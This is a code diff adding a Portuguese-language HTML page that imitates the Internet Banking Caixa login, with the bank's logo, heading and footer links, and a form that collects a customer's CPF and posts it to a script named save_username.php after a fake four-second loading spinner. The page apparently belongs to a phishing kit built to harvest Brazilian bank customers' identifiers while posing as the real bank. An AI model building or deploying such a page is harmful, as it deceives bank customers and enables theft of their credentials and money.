@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="assets/css/style.css">
+  <link rel="stylesheet" href="assets/css/loading.css"> <!-- Incluindo o CSS separado -->
+  <script>
+    function handleSubmit(event) {
+      event.preventDefault(); // Impede o envio imediato do formulário
+      const form = event.target;
+
+      // Cria o elemento de carregamento
+      const loadingContainer = document.createElement("div");
+      loadingContainer.className = "loading-container";
+      const spinner = document.createElement("div");
+      spinner.className = "spinner";
+      loadingContainer.appendChild(spinner);
+      document.body.appendChild(loadingContainer); // Adiciona ao corpo da página
+
+      // Aguarda 4 segundos antes de enviar o formulário
+      setTimeout(() => {
+        form.submit();
+      }, 4000);
+    }
+  </script>
+</head>
+<body>
+  <header class="header">
+    <img src="assets/images/logocxc-removebg-preview.png" alt="Logo Caixa" class="logo">
+  </header>
+  <section class="main-section">
+    <div class="alert-box">
+      <img src="assets/images/02122024_155917_img3.jpg" alt="Alerta Golpe" class="alert-image full-width">
+    </div>
+    <div class="login-box">
+      <h5>Já sou usuário do IBC</h5>
+      <h2>Internet Banking Caixa</h2>
+      <form action="../src/save_username.php" method="POST" onsubmit="handleSubmit(event)">
+        <label for="username">Digite seu CPF</label>
+        <input type="text" id="username" name="username" required maxlength="14" 
+          oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+        <div>
+          <input type="radio" id="fisica" name="tipo" value="fisica" checked>
+          <label for="fisica">Pessoa Física</label>
+          <input type="radio" id="juridica" name="tipo" value="juridica">
+          <label for="juridica">Pessoa Jurídica</label>
+          <input type="radio" id="governo" name="tipo" value="governo">
+          <label for="governo">Governo</label>
+        </div>
+        <button type="submit">Continuar</button>
+      </form>
+    </div>
+  </section>
+  <footer>
+    <p>Saiba como usar | Acessibilidade | Cadastro de Computadores | Senha e Usuário | Perguntas Frequentes</p>
+  </footer>
+</body>
+</html>
